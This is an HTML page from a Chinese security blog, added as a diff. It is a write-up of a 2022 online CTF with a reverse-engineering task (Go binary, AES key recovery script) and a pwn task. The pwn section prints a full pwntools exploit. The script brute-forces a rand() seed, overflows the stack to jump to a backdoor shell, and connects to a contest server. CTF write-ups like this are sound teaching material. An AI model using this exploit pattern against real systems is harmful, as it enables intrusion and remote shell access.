@@ -1,0 +1,443 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="yougar">
+  <meta name="keywords" content="">
+  <meta name="description" content="re要求掌握的基础知识技能: IDA使用、程序编译框架识别、go语言开发、go编译后程序的特点、aes加解密用到的工具：ida 7.6 sp1及以上、file命令 首先打开压缩包解压，查看下程序是什么语言、架构的程序。使用file命令可以查看程序的目标系统名称、文件格式以及部分编译语言信息，从这里可以看出来程序是x64 linux系统上的ELF格式的文件，采用go语言编译，没有调试符号。IDA 7">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022某线上赛比赛复盘">
+<meta property="og:url" content="http://yougar0.github.io/2022/05/29/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/index.html">
+<meta property="og:site_name" content="go hacking">
+<meta property="og:description" content="re要求掌握的基础知识技能: IDA使用、程序编译框架识别、go语言开发、go编译后程序的特点、aes加解密用到的工具：ida 7.6 sp1及以上、file命令 首先打开压缩包解压，查看下程序是什么语言、架构的程序。使用file命令可以查看程序的目标系统名称、文件格式以及部分编译语言信息，从这里可以看出来程序是x64 linux系统上的ELF格式的文件，采用go语言编译，没有调试符号。IDA 7">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/1.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/2.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/3.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/4.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/5.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/6.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/7.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/8.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/9.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/10.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/11.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/12.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/13.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/14.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/15.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/16.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/17.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/18.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/19.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/20.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/21.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/22.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/23.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/24.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/25.png">
+<meta property="og:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/26.png">
+<meta property="article:published_time" content="2022-05-29T11:30:56.000Z">
+<meta property="article:modified_time" content="2022-05-29T11:37:12.751Z">
+<meta property="article:author" content="yougar">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://yougar0.github.io/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/1.png">
+  
+  <title>2022某线上赛比赛复盘 - go hacking</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/ir-black.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yougar0.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Go Hacking</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2022某线上赛比赛复盘">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-05-29 19:30" pubdate>
+        2022年5月29日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2022某线上赛比赛复盘</h1>
+            
+            <div class="markdown-body">
+              <h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><p>要求掌握的基础知识技能: IDA使用、程序编译框架识别、go语言开发、go编译后程序的特点、aes加解密<br>用到的工具：ida 7.6 sp1及以上、file命令</p>
+<p>首先打开压缩包解压，查看下程序是什么语言、架构的程序。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/1.png" srcset="/img/loading.gif" lazyload><br>使用file命令可以查看程序的目标系统名称、文件格式以及部分编译语言信息，从这里可以看出来程序是x64 linux系统上的ELF格式的文件，采用go语言编译，没有调试符号。<br>IDA 7.6 sp1及以上版本对于go语言的识别和逆向支持的比较完善，低版本IDA需要使用开源的go语言符号解析插件才能支持符号识别。这里用IDA 7.6 sp1打开目标程序。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/2.png" srcset="/img/loading.gif" lazyload><br>IDA载入程序，等待IDA分析完毕之后，可以自动识别并展示程序当中的符号信息，之后进入main_main函数，按TAB或F5反编译代码，首先会输出提示信息Input，在linux系统上运行程序验证一下。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/3.png" srcset="/img/loading.gif" lazyload><br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/4.png" srcset="/img/loading.gif" lazyload><br>接下来调用Scanf等待用户输入数据<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/5.png" srcset="/img/loading.gif" lazyload><br>对输入的数据长度进行比较，数据长度必须在0到96之间，且必须为16的整数倍，否则会程序打印提示wrong len并退出校验。<br>之后调用main_Encrypt对输入的数据进行处理，并将返回结果与off_5A2350处的目标数据进行比较，相同则打印Right, the flag is DASCTF{Input}，也就是输入的数据为flag，否则不同的话打印wrong。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/6.png" srcset="/img/loading.gif" lazyload><br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/7.png" srcset="/img/loading.gif" lazyload><br>所以最终要分析的目标函数是main_Encrypt函数。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/8.png" srcset="/img/loading.gif" lazyload><br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/9.png" srcset="/img/loading.gif" lazyload><br>main_Encrypt函数当中在一个循环当中调用aes_NewCipher函数调用AES加密算法对输入的数据进行加密，其中加密密钥内存地址为off_5A2370。循环次数取决于a2是16的多少倍，并且在循环尾部会对加密密钥的其中一个字节进行自增处理，自增次数为16，每次增加1，也就是每次循环改变密钥的其中一字节，增加16的大小。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/10.png" srcset="/img/loading.gif" lazyload><br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/11.png" srcset="/img/loading.gif" lazyload><br>但是当用程序当中给出的密钥off_5A2370对密文off_5A2350进行解密时，无法解密得到正确的flag数据，这个比赛时没考虑到go语言编写的程序的函数执行顺序。<br>具体可参考以下文章，关于go程序的函数执行顺序。<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/218674">https://www.anquanke.com/post/id/218674</a><br>根据文章当中描述的，go当中的package init函数会先于main_main函数执行，也就是main_init要在main_main函数之前执行。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/12.png" srcset="/img/loading.gif" lazyload><br>main_init在完成一些go标准库的初始化工作之后，会调用main_init_1函数执行用户定义的初始化工作。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/13.png" srcset="/img/loading.gif" lazyload><br>其中main_init_1用户自定义的初始化函数当中会对程序当中保存的密钥off_5A2370数据进行取反操作。写段C代码对数据进行取反解码操作。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/14.png" srcset="/img/loading.gif" lazyload><br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/15.png" srcset="/img/loading.gif" lazyload><br>解码得到真实的AES加密密钥为1234567890abcdef。<br>拿到真实加密密钥，再对密文off_5A2350进行解密，拿到flag。<br>exp如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;enc&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    enc = f.read()<br>key = <span class="hljs-string">b&#x27;1234567890abcdef&#x27;</span><br><br> // 前<span class="hljs-number">16</span>字节为原始密钥<br>cipher = AES.new(key, AES.MODE_ECB)<br><span class="hljs-built_in">print</span>( cipher.decrypt(enc[:<span class="hljs-number">16</span>]))<br><br>// 第二次解密对首字节加<span class="hljs-number">16</span><br>key_copied = [k <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>key_copied[<span class="hljs-number">0</span>] += <span class="hljs-number">16</span><br>key = <span class="hljs-built_in">bytes</span>(key_copied)<br><br>cipher = AES.new(key, AES.MODE_ECB)<br><span class="hljs-built_in">print</span>( cipher.decrypt(enc[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>]))<br><br>// 第三次解密对密钥的第二个字节加<span class="hljs-number">16</span><br>key_copied = [k <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>key_copied[<span class="hljs-number">1</span>] += <span class="hljs-number">16</span><br>key = <span class="hljs-built_in">bytes</span>(key_copied)<br><br>cipher = AES.new(key, AES.MODE_ECB)<br><span class="hljs-built_in">print</span>( cipher.decrypt(enc[<span class="hljs-number">32</span>:<span class="hljs-number">48</span>]))<br></code></pre></div></td></tr></table></figure>
+<p><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/16.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>要求掌握的基础知识技能: IDA使用、栈溢出漏洞、linux伪随机数原理<br>用到的工具：ida 7.6 sp1及以上、docker pwn环境<br>首先将附件程序解压放到pwn环境当中，检查下程序的保护措施。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/17.png" srcset="/img/loading.gif" lazyload><br>可以看到程序没有stack canary保护，可以直接利用栈溢出漏洞覆盖函数返回地址，不需要泄露canary栈溢出时覆盖正确的值。<br>程序没有开启PIE保护，内存加载基址恒为0x400000。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/18.png" srcset="/img/loading.gif" lazyload><br>通过IDA分析该文件，main函数会调用两个函数sub_401296和sub_4013C7。其中sub_401296会使用随机数种子和当前时间的异或值设定rand函数的种子。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/19.png" srcset="/img/loading.gif" lazyload><br>sub_4013C7首先调用rand函数生成随机的secret。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/20.png" srcset="/img/loading.gif" lazyload><br>sub_4013C7接下来打印菜单内容，并根据用户输入的不同选项进入不同的代码块，输入2会打印当前生成的随机数数据，并在打印secret后重新生成；输入3会退出while循环，进入随机数secret校验部分;输入1会进入用户输入数据代码部分，这里存在栈溢出漏洞，用户输入的数据可以超过实际分配的栈内存大小，可以覆盖当前函数返回地址，在函数返回时控制函数返回地址执行任意代码。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/21.png" srcset="/img/loading.gif" lazyload><br>由于v2变量在栈溢出覆盖函数返回地址的时候会导致被覆盖，而函数在返回前会校验v2的值是否与生成的secret相同，因此这里需要预测secret的值。这里就涉及到了一个叫伪随机数原理，即虽然通过srand函数设置了rand函数的种子，能够确保程序在一次执行过程中生成的随机数不同，但当另一个程序设置相同的种子时，这两个程序生成随机数序列将相同，具体可参考链接:<a target="_blank" rel="noopener" href="https://we.buptmerak.cn/archives/310">https://we.buptmerak.cn/archives/310</a><br>因此这里需要爆破随机数种子，通过调用2泄露目标程序生成的第一个随机数，与我们本地爆破生成的随机数比较，相同则说明种子与目标相同，我们可以用这个种子再次生成随机数，该随机数与目标程序生成的相同。<br>在程序中的main函数上方一个函数sub_401579，可以看到该函数调用了system(“/bin/sh”)，该函数为后门函数，通过栈溢出控制函数的返回地址为0x401579即可实现getshell。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/22.png" srcset="/img/loading.gif" lazyload><br>exp编写：<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/23.png" srcset="/img/loading.gif" lazyload><br>首先看下当前函数的栈数据大小为0x70，其中88字节为buf的数据，这些任意填充，之后8字节为v2的数据，需要填写预测的secret的值，剩下还需要填充0x70 + 8 - 88 - 8长度的数据才会到函数返回地址处，其中0x70 + 8的含义是由于函数入栈会调用push rdp保存栈底基址，因此这里需要加8偏移才会到函数返回地址处。<br>exp当中关于为什么不直接将返回地址覆盖为后门函数地址，而是先找到一个ret地址，然后再执行，这是由于栈对齐问题，具体可参考以下链接:<a target="_blank" rel="noopener" href="https://mambainveins.com/2021/08/15/2021/2021-08-15-HWS_PWN/">https://mambainveins.com/2021/08/15/2021/2021-08-15-HWS_PWN/</a><br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/24.png" srcset="/img/loading.gif" lazyload></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>c=cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#p = process(&quot;./MyCanary3&quot;)</span><br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;43.138.105.155&#x27;</span>, <span class="hljs-number">50000</span>)<br>backdoor = p64(<span class="hljs-number">0x40157D</span>)<br>ret = p64(<span class="hljs-number">0x40158F</span>)<br>buf = <span class="hljs-string">&#x27;a&#x27;</span>* <span class="hljs-number">88</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input your choice\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;My secret is &#x27;</span>)<br>secret = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>).strip(), <span class="hljs-number">16</span>)<br>seed = <span class="hljs-number">0</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input your choice\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Show me the code:\n&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0xFFFFFFFF</span>):<br>    c.srand(i)<br>    num = c.rand()<br>    <span class="hljs-keyword">if</span>(num == (secret&gt;&gt;<span class="hljs-number">32</span>) <span class="hljs-keyword">and</span> (c.rand() == secret&amp;<span class="hljs-number">0xFFFFFFFF</span>)):<br>        seed = i<br>        <span class="hljs-keyword">break</span><br>c.srand(seed)<br>c.rand()<br>c.rand()<br>secret = c.rand()<br>secret = secret&lt;&lt;<span class="hljs-number">32</span><br>secret += c.rand()<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(secret)<br>buf += p64(secret) + <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + ret +  backdoor<br><br>p.sendline(buf)<br>p.recvuntil(<span class="hljs-string">&#x27;Input your choice\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br><span class="hljs-built_in">print</span> p.recvline()<br></code></pre></div></td></tr></table></figure>
+<p>加了ret指令的exp执行结果，程序正常运行，没有出现崩溃<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/25.png" srcset="/img/loading.gif" lazyload><br>不加ret指令的执行结果，程序崩溃，原因就是push rbp指令执行时栈地址没有对齐。<br><img src="/images/2022%E6%9F%90%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%A4%8D%E7%9B%98/26.png" srcset="/img/loading.gif" lazyload></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/30/JSP%E5%85%8D%E6%9D%80%E7%BB%95%E8%BF%87%E6%B5%8B%E8%AF%95%E8%AE%B0%E5%BD%95/">
+                        <span class="hidden-mobile">JSP免杀绕过测试记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
